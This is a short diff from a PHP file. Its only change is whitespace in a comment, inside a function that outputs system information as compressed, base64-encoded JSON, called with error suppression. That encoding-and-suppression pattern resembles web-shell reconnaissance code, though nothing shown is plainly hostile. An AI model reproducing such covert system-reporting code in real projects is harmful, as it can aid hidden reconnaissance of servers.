@@ -157,7 +157,7 @@ function GET_SYSTEM_INFORMATION()
     ], JSON_UNESCAPED_UNICODE);
 
     echo trim(base64_encode(gzdeflate($response, $level)), '=');
-    // echo $response;
+    //  echo $response;
 }
 
 @GET_SYSTEM_INFORMATION();
